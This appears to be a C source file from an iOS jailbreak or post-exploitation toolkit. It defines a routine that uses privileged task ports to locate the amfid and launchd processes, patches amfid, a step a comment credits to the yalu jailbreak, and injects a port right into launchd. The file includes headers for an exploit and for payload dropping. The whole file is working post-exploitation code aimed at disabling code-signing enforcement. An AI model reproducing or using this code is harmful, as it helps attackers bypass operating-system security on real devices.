#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdarg.h>
#include <pthread.h>
#include <spawn.h>

#import <copyfile.h>
#import <sys/stat.h>

#include <mach/mach.h>
#include <mach/task.h>
#include <mach/mach_error.h>
#include <mach/mach_traps.h>

#include "post_exploit.h"
#include "sploit.h"

#include "remote_ports.h"

#include <CoreFoundation/CoreFoundation.h>

// use the processor_set_tasks feature to get the task ports for everything:
#include "task_ports.h"

#include "patch_amfid.h"
#include "drop_payload.h"
#include "Utilities.h"

int prepare_amfid(mach_port_t tp) {
    
    refresh_task_ports_list(tp);
    
    mach_port_t amfid_task_port = find_task_port_for_path("/usr/libexec/amfid");
    task_t task = find_task_port_for_path("/sbin/launchd");
    
    printf("[INFO]: amfid task port: %x\n", amfid_task_port);
    
    patch_amfid(amfid_task_port); // taken from yalu
    
    // Set the privileged port so we can use it later
    set_privileged_port(tp, task);
    
    mach_port_name_t self_task_port = push_local_port(task, task, MACH_MSG_TYPE_COPY_SEND);
    
    if(self_task_port == MACH_PORT_NULL) {
        return 0;
    }
    
    set_self_port_name(self_task_port);
    
    return 1;
}
